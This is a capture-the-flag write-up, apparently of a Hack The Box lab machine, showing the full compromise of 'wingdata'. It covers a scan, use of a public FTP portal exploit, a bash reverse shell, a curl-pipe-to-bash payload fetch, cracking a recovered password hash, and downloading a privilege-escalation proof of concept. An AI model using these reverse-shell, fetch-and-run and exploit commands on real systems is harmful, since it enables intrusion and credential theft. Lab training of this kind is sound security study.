# wingdata

---

## Nmap scan 

```
nmap -sCV 10.129.50.126
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 18:14 EDT
Nmap scan report for 10.129.50.126
Host is up (0.091s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.99 seconds

```

## when open website found :

<img width="1919" height="573" alt="image" src="https://github.com/user-attachments/assets/3dbee8b3-1fea-4797-894e-36ccbd5b5a0a" />

## when click **`client portal`** found there is subdomain call **`ftp`**

<img width="1919" height="683" alt="image" src="https://github.com/user-attachments/assets/56a0618a-9bd7-4a53-b5ec-94a860399387" />

## when search on [exploit](https://www.exploit-db.com/exploits/52347) on it found 

<img width="1919" height="922" alt="image" src="https://github.com/user-attachments/assets/99a7ed01-fd26-42eb-995f-bd04bc484a46" />

```
python3 52347.py -u http://ftp.wingdata.htb -U anonymous -c "whoami"
```

<img width="1287" height="250" alt="image" src="https://github.com/user-attachments/assets/76183a3a-10b7-4136-9fdd-119b2cc8f9c5" />

---

```
echo 'bash -i >& /dev/tcp/10.10.16.113/9999 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8888
```

```
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
        -c "curl http://10.10.16.113:8888/shell.sh|bash" -v
```

<img width="1439" height="252" alt="image" src="https://github.com/user-attachments/assets/1dd5f0cb-5988-46a8-b153-796a28f81a51" />

---

## get shell

<img width="902" height="231" alt="image" src="https://github.com/user-attachments/assets/0e66ce3c-bdb5-490b-8600-ef2041375353" />

## after digging in system found :

<img width="1179" height="349" alt="image" src="https://github.com/user-attachments/assets/50beba68-0605-4423-a006-933e088609fa" />

```
wacky : 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

```
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca' > hash.txt
```

```
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

<img width="1499" height="566" alt="image" src="https://github.com/user-attachments/assets/72c9134c-4055-4864-a5ad-aa73d7e50e33" />

## found first user

```
wacky : !#7Blushing^*Bride5
```

## login with ssh 

```
ssh wacky@10.129.244.106   
```

<img width="1185" height="358" alt="image" src="https://github.com/user-attachments/assets/e345dce3-4984-4de0-88f6-47ca229ddc33" />

## privesc

```
sudo -l
```

<img width="1131" height="154" alt="image" src="https://github.com/user-attachments/assets/5bf17b4b-d4f2-4f64-a2c0-697f7bb8732d" />

```
# On Kali
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC
cd CVE-2025-4517-POC
python3 -m http.server 80

# On target
cd /tmp
wget http://YOUR_IP/CVE-2025-4517-POC.py
python3 /tmp/CVE-2025-4517-POC.py
```

<img width="777" height="151" alt="image" src="https://github.com/user-attachments/assets/5925e7f4-6877-4db3-825b-19b93722aed9" />

